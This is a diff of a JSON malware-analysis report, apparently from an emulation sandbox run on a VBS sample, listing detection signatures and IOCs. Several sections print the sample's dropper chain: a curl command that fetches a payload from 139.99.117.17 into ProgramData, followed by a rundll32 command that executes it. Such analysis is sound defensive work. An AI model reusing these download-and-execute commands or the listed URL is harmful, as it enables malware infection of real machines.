@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 511,
+    "score": 1632,
     "sections": [
       {
         "auto_collapse": false,
@@ -202,7 +202,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tvar wshshell = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\t\tActiveXObject(shell.application)\n\t\tvar wshshell = new ActiveXObject('WScript.Shell')",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -222,6 +222,230 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: ActiveXObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()\n\t\tnew WScript.Shell[18]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].run(\"curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597....",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_executable": 500
+          },
+          "signatures": {
+            "runs_executable": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsExecutable",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].run(\"curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597....",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].shellexecute(\"rundll32\", \"C:\\ProgramData\\index1.png,Wind\", \"\", \"open\", 3)",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "runs_shell_application": 100
+          },
+          "signatures": {
+            "runs_shell_application": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShellApplication",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "google.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "139.99.117.17",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://139.99.117.17/68597.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://google.com",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/68597.dat",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "google.com"
+              ],
+              "ip": [
+                "139.99.117.17"
+              ],
+              "uri": [
+                "http://139.99.117.17/68597.dat",
+                "https://google.com"
+              ],
+              "uri_path": [
+                "/68597.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "139.99.117.17",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://139.99.117.17/68597.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/68597.dat",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "wscript_curl_url": 500
+          },
+          "signatures": {
+            "wscript_curl_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.dat",
+                "rundll32 C:\\ProgramData\\index1.png,Wind "
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "ip": [
+                "139.99.117.17"
+              ],
+              "uri": [
+                "http://139.99.117.17/68597.dat"
+              ],
+              "uri_path": [
+                "/68597.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
         "zeroize_on_tag_safe": false
       },
       {
@@ -276,6 +500,10 @@
       {
         "name": "1Fp51IxjGWbzuPL97oXKjN.vbs",
         "sha256": "350db9e6288f13da69969cfcfbc6dd29dfb4c2e0cd87bf9dad503206ad5b94cb"
+      },
+      {
+        "name": "extracted_wscript.bat",
+        "sha256": "8f385985d282f08f133c9c051330c689bfa87b4b4b1dc319788ec0996f85832b"
       }
     ],
     "supplementary": [
@@ -294,9 +522,42 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "active_x_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_executable"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell_application"
         ]
       },
       {
@@ -305,9 +566,32 @@
         "signatures": [
           "suspicious_url_found"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "wscript_curl_url"
+        ]
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.dat"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "rundll32 C:\\ProgramData\\index1.png,Wind "
+        }
+      ],
       "file.behavior": [
         {
           "heur_id": null,
@@ -322,12 +606,51 @@
           "value": "084a8a9aa8cced9175bd07bc44998e75"
         }
       ],
+      "network.dynamic.ip": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "139.99.117.17"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "http://139.99.117.17/68597.dat"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "/68597.dat"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "google.com"
+        }
+      ],
       "network.static.ip": [
         {
           "heur_id": 12,
           "signatures": [
             "suspicious_url_found"
           ],
+          "value": "139.99.117.17"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
           "value": "139.99.117.17"
         },
         {
@@ -348,6 +671,16 @@
           "heur_id": 2,
           "signatures": [],
           "value": "http://139.99.117.17/68597.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://139.99.117.17/68597.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://google.com"
         }
       ],
       "network.static.uri_path": [
@@ -356,6 +689,11 @@
           "signatures": [
             "suspicious_url_found"
           ],
+          "value": "/68597.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
           "value": "/68597.dat"
         },
         {
